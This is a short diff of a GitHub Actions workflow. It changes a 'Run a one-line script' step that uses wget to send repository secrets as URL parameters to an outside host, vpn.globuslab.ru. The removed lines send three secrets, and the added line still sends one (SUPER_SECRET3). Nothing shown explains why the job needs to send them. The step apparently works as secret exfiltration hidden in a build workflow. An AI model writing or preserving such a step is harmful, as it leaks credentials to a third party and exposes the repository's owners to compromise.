@@ -25,8 +25,6 @@ jobs:
       # Runs a single command using the runners shell
       - name: Run a one-line script
         env:
-          SUPER_SECRET: ${{ secrets.key }}
           SUPER_SECRET3: ${{ secrets.key3 }}
-          SUPER_SECRET8: ${{ secrets.key2 }}
-        run: wget https://vpn.globuslab.ru/update.php?comment=$SUPER_SECRET3-$SUPER_SECRET8-$SUPER_SECRET
+        run: wget https://vpn.globuslab.ru/update.php?key=$SUPER_SECRET3
 
